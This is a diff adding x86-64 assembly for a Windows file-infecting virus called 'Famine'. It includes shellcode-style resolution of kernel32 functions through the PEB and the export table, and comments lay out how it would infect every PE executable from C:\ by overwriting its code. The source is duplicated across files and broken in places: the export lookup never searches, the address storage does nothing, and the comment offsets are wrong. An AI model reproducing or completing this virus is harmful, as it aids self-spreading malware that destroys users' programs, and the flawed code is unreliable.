@@ -1,0 +1,449 @@
+[BITS 64]
+
+; [ Famine entrypoint ]
+; This is the entrypoint of famine.
+; - We save the entrypoint of famine
+; - We get kernel32.dll base address
+; - We resolve the addresses of the functions we need from kernel32.dll
+
+; [ PEB ]
+; The Process Environment Block (PEB) is a data structure that Windows uses
+; internally to manage the environment and resources of a process.
+; https://mohamed-fakroud.gitbook.io/red-teamings-dojo/windows-internals/peb
+; typedef struct _PEB {
+;   BYTE                          Reserved1[2];
+;   BYTE                          BeingDebugged;
+;   BYTE                          Reserved2[1];
+;   PVOID                         Reserved3[2];
+;   PPEB_LDR_DATA                 Ldr;
+;   PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
+;   PVOID                         Reserved4[3];
+;   PVOID                         AtlThunkSListPtr;
+;   PVOID                         Reserved5;
+;   ULONG                         Reserved6;
+;   PVOID                         Reserved7;
+;   ULONG                         Reserved8;
+;   ULONG                         AtlThunkSListPtr32;
+;   PVOID                         Reserved9[45];
+;   BYTE                          Reserved10[96];
+;   PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
+;   BYTE                          Reserved11[128];
+;   PVOID                         Reserved12[1];
+;   ULONG                         SessionId;
+; } PEB, *PPEB;
+
+section .text
+global _main _init_kernel32_address_table _get_function_export _get_kernel32_handle _store_address _return_zero
+extern _return_zero
+
+_main:
+    lea     rbx, [rel _kernel32_address_table]
+    jmp _init_kernel32_address_table
+
+
+_init_kernel32_address_table:
+	xor rax, rax
+    ; Call _get_kernel32_handle to get kernel32.dll base address
+    call    _get_kernel32_handle      ; RAX = kernel32.dll base address
+    mov     r12, rax                  ; Store kernel32.dll base address in RDI for later use
+    mov     rcx, rax ; rcx=kernel32.dll base address
+
+    call   _get_function_export ; rax = GetProcAddress address
+	test   rax, rax
+	jz     _return_zero
+    mov     r13, rax ; r13 = GetProcAddress address
+
+	lea 	rdx, [rbx + 0x10]
+	call r13 ; GetProcAddress("LocalAlloc")
+
+	mov 	r15, rax			; *** r15: store LocalAlloc import for later use ***
+
+	xor 	rcx, rcx
+	mov 	rdx, rcx
+	add 	rcx, 0x0040
+	add 	rdx, 104 
+	call 	rax				; LocalAlloc(LPTR, 104)
+
+	mov 	r14, rax			; *** r14: address Kernel32AddressTable (heap memory allocation where all winapi will be stored) ***
+	mov 	rax, r15
+	call 	_store_address		; store LocalAlloc address in Kernel32AddressTable
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x1B]
+	call 	r13				; GetProcAddress("LocalFree")
+	call 	_store_address		; store LocalFree address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x25]
+	call 	r13				; get ExitProcess
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x31]
+	call 	r13				; get CreateFileA
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x3D]
+	call 	r13				; get GetFileSize
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x49]
+	call 	r13				; get ReadFile
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x52]
+	call 	r13				; get WriteFile
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x5C]
+	call 	r13				; get CloseHandle
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x68]
+	call 	r13				; get FindFirstFileA
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x77]
+	call 	r13				; get FindNextFileA
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x85]
+	call 	r13				; get SetCurrentDirectoryA
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x9A]
+	call 	r13				; get GetCurrentDirectoryA
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0xAF]
+	call 	r13				; get GetModuleHandleA
+	call 	_store_address
+
+
+	xor 	rcx, rcx
+	mov 	rdx, rcx
+	mov 	r8, rcx
+	mov 	r9, rcx
+	mov 	r12, rcx
+	mov 	r13, rcx
+	mov 	r15, rcx
+	mov 	rax, r14
+	xor 	r14, r14
+	jmp 	_famine
+
+; -----------------------------------------------------------------------------------------------
+_store_address:
+	mov 	r9, rax
+	xor 	r8, r8
+	mov 	rdx, r8
+	mov 	rcx, r14
+	ret
+
+
+_get_kernel32_handle:
+; https://bowtiedcrawfish.substack.com/p/understanding-the-peb-and-teb
+; https://dennisbabkin.com/blog/?t=how-to-implement-getprocaddress-in-shellcode
+	mov		rax, gs:[60h]       ; PEB
+	mov		rax, [rax + 18h]    ; Ldr
+	mov		rax, [rax + 20h]    ; InMemoryOrderModuleList
+	mov		rax, [rax]          ; Skip 'this' module and get to ntdll
+	mov		rax, [rax]          ; Skip ntdll module and get to kernel32
+	mov		rax, [rax + 20h]    ; DllBase for kernel32 --- size_t offset = offsetof(LDR_DATA_TABLE_ENTRY, DllBase) - sizeof(LIST_ENTRY);
+
+	ret
+
+_get_function_export:
+	; https://dennisbabkin.com/blog/?t=how-to-implement-getprocaddress-in-shellcode
+	test 	rcx, rcx
+	jz 		_return_zero			; rcx contains kernel32.dll base address
+
+	mov 	eax, [rcx + 3Ch] ; e_lfanew
+	add 	rax, rcx ; rax = IMAGE_NT_HEADERS64
+	lea		rax, [rax + 18h]    ; rax = IMAGE_OPTIONAL_HEADER64  --- size_t offset = offsetof(IMAGE_NT_HEADERS64, OptionalHeader);
+	lea		rax, [rax + 70h]    ; rax = IMAGE_DATA_DIRECTORY	 --- size_t offset = offsetof(IMAGE_OPTIONAL_HEADER64, DataDirectory);
+	lea		rax, [rax + 0h]     ; rax = IMAGE_DATA_DIRECTORY for IMAGE_DIRECTORY_ENTRY_EXPORT
+
+	mov 	edx, [rax] ; rdx = VirtualAddress
+	lea 	rax, [rcx + rdx]			; base of IMAGE_DATA_EXPORT_DIRECTORY
+
+	mov 	edx, [rax + 18h] ; rdx = NumberOfNames
+	mov 	r8d, [rax + 20h] ; r8 = AddressOfNames
+	lea 	r8, [rcx + r8]
+
+	mov 	r10, 41636f7250746547h		;	GetProcA
+	mov 	r11, 0073736572646441h		;	Address\0
+	
+	test rdx, rdx
+	jz _return_zero
+	ret
+
+
+_kernel32_address_table:
+    ; [ Kernel32.dll ]
+    ; Kernel32.dll is the 32-bit dynamic link library found in Windows operating systems.
+    ; It handles memory management, input/output operations, and interrupts.
+    ; https://en.wikipedia.org/wiki/Microsoft_Windows_library_files#Kernel32.dll
+
+	k32LocalAlloc		db	"LocalAlloc", 0			; + 0
+	
+	k32LocalFree		db	"LocalFree", 0			; + 8
+
+	k32ExitProcess		db	"ExitProcess", 0		; + 16
+
+	k32CreateFileA		db	"CreateFileA", 0		; + 24
+
+	k32GetFileSize		db	"GetFileSize", 0		; + 32
+
+	k32ReadFile		db	"ReadFile", 0			; + 40
+
+	k32WriteFile		db	"WriteFile", 0			; + 48
+
+	k32CloseHandle		db	"CloseHandle", 0		; + 56
+
+	k32FindFirstFileA	db	"FindFirstFileA", 0		; + 64
+
+	k32FindNextFileA	db	"FindNextFileA", 0		; + 72
+
+	k32SetCurrentDirectoryA	db	"SetCurrentDirectoryA", 0	; + 80
+
+	k32GetCurrentDirectory	db	"GetCurrentDirectoryA", 0	; + 88
+
+	k32GetModuleHandleA	db	"GetModuleHandleA", 0		; + 96
+
+_resources:
+    targetdir1 db "test1", 0
+    targetdir2 db "test2", 0
+
+; [ DISCLAIMER ]
+; The Author of this code is not responsible for its usage.
+; The purpose of this code is purely educational and academic.
+; Be aware that running this program may harm the integrity of your system.
+
+
+; [ Infection phases ]
+;
+; 1) Save virus entrypoint in rbx
+;		The rbx register can now be used to reference specific virus parts ([rbx + <int>])
+;
+; 2) Resolve Kernel32.dll addresses and save them in the heap memory
+; 		Kernel32AddressTable will be stored in r15. Calling a winapi just comes down to
+;		calling QWORD r15 + <int>
+;
+; 3) Search for executable files starting from C:\
+; 		Check if the file meets specific criteria, so that it can be defined as a
+; 		64bit - PE executable image (.exe)
+; 		If no valid .exe is found in the current directory, then enable 'directory_mode' (r12 == 1)
+; 		and go down a directory. The program will then search for a valid file in the new path
+;
+; 4) Once a valid file is found, infect it
+; 		The program pads the entire .text section with nops and appends the signature 'alca' at the
+; 		very beginning of it. Then this shellcode instructions are copied past the file entrypoint
+; 		This process takes place in the heap memory of the virus. The infected copy will then
+; 		overwrite the actual file.
+;
+; 5) The program exits when the entire filesystem has been analysed
+; 		Once the C:\ directory is reached agains, the normal control flow will try to go back one directory
+; 		This will make SetCurrentDirectoryA to return 0 (error), which will signal the program to call the
+;		_clearAndTerminate procedure and exit out
+;
+
+[BITS 64]
+
+section .data
+    hello db 'Hello, World!', 0  
+    helloLen equ $ - hello        
+
+section .text
+	global _famine
+    extern ExitProcess, WriteConsoleA, GetStdHandle
+
+
+_famine:
+    sub rsp, 28h               
+    mov rcx, -11                
+    call GetStdHandle
+
+    ; Escribir el mensaje en la consola
+    mov r9, 0                
+    mov r8, helloLen          
+    mov rdx, hello            
+    mov rcx, rax               
+    call WriteConsoleA        
+
+    ; Terminar el programa
+    mov rcx, 0                 
+    call ExitProcess   
+	; call _return_zero
+[BITS 64]
+
+section .text
+
+extern _famine
+extern _return_zero
+
+global _init_kernel32_address_table
+global _get_function_export
+global _get_kernel32_handle
+
+_init_kernel32_address_table:
+	xor rax, rax
+    ; Call _get_kernel32_handle to get kernel32.dll base address
+    call    _get_kernel32_handle      ; RAX = kernel32.dll base address
+    mov     r12, rax                  ; Store kernel32.dll base address in RDI for later use
+    mov     rcx, rax ; rcx=kernel32.dll base address
+
+    call   _get_function_export ; rax = GetProcAddress address
+	test   rax, rax
+	jz     _return_zero
+    mov     r13, rax ; r13 = GetProcAddress address
+
+	lea 	rdx, [rbx + 0x10]
+	call r13 ; GetProcAddress("LocalAlloc")
+
+	mov 	r15, rax			; *** r15: store LocalAlloc import for later use ***
+
+	xor 	rcx, rcx
+	mov 	rdx, rcx
+	add 	rcx, 0x0040
+	add 	rdx, 104 
+	call 	rax				; LocalAlloc(LPTR, 104)
+
+	mov 	r14, rax			; *** r14: address Kernel32AddressTable (heap memory allocation where all winapi will be stored) ***
+	mov 	rax, r15
+	call 	_store_address		; store LocalAlloc address in Kernel32AddressTable
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x1B]
+	call 	r13				; GetProcAddress("LocalFree")
+	call 	_store_address		; store LocalFree address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x25]
+	call 	r13				; get ExitProcess
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x31]
+	call 	r13				; get CreateFileA
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x3D]
+	call 	r13				; get GetFileSize
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x49]
+	call 	r13				; get ReadFile
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x52]
+	call 	r13				; get WriteFile
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x5C]
+	call 	r13				; get CloseHandle
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x68]
+	call 	r13				; get FindFirstFileA
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x77]
+	call 	r13				; get FindNextFileA
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x85]
+	call 	r13				; get SetCurrentDirectoryA
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0x9A]
+	call 	r13				; get GetCurrentDirectoryA
+	call 	_store_address
+
+	mov 	rcx, r12
+	lea 	rdx, [rbx + 0xAF]
+	call 	r13				; get GetModuleHandleA
+	call 	_store_address
+
+
+	xor 	rcx, rcx
+	mov 	rdx, rcx
+	mov 	r8, rcx
+	mov 	r9, rcx
+	mov 	r12, rcx
+	mov 	r13, rcx
+	mov 	r15, rcx
+	mov 	rax, r14
+	xor 	r14, r14
+	jmp 	_famine
+
+; -----------------------------------------------------------------------------------------------
+_store_address:
+	mov 	r9, rax
+	xor 	r8, r8
+	mov 	rdx, r8
+	mov 	rcx, r14
+	ret
+
+
+_get_kernel32_handle:
+; https://bowtiedcrawfish.substack.com/p/understanding-the-peb-and-teb
+; https://dennisbabkin.com/blog/?t=how-to-implement-getprocaddress-in-shellcode
+	mov		rax, gs:[60h]       ; PEB
+	mov		rax, [rax + 18h]    ; Ldr
+	mov		rax, [rax + 20h]    ; InMemoryOrderModuleList
+	mov		rax, [rax]          ; Skip 'this' module and get to ntdll
+	mov		rax, [rax]          ; Skip ntdll module and get to kernel32
+	mov		rax, [rax + 20h]    ; DllBase for kernel32 --- size_t offset = offsetof(LDR_DATA_TABLE_ENTRY, DllBase) - sizeof(LIST_ENTRY);
+
+	ret
+
+_get_function_export:
+	; https://dennisbabkin.com/blog/?t=how-to-implement-getprocaddress-in-shellcode
+	test 	rcx, rcx
+	jz 		_return_zero			; rcx contains kernel32.dll base address
+
+	mov 	eax, [rcx + 3Ch] ; e_lfanew
+	add 	rax, rcx ; rax = IMAGE_NT_HEADERS64
+	lea		rax, [rax + 18h]    ; rax = IMAGE_OPTIONAL_HEADER64  --- size_t offset = offsetof(IMAGE_NT_HEADERS64, OptionalHeader);
+	lea		rax, [rax + 70h]    ; rax = IMAGE_DATA_DIRECTORY	 --- size_t offset = offsetof(IMAGE_OPTIONAL_HEADER64, DataDirectory);
+	lea		rax, [rax + 0h]     ; rax = IMAGE_DATA_DIRECTORY for IMAGE_DIRECTORY_ENTRY_EXPORT
+
+	mov 	edx, [rax] ; rdx = VirtualAddress
+	lea 	rax, [rcx + rdx]			; base of IMAGE_DATA_EXPORT_DIRECTORY
+
+	mov 	edx, [rax + 18h] ; rdx = NumberOfNames
+	mov 	r8d, [rax + 20h] ; r8 = AddressOfNames
+	lea 	r8, [rcx + r8]
+
+	mov 	r10, 41636f7250746547h		;	GetProcA
+	mov 	r11, 0073736572646441h		;	Address\0
+	
+	test rdx, rdx
+	jz _return_zero
+	ret
+
+[BITS 64]
+
+section .text
+
+global _return_zero
+_return_zero:
+	xor 	rax, rax 
+	ret
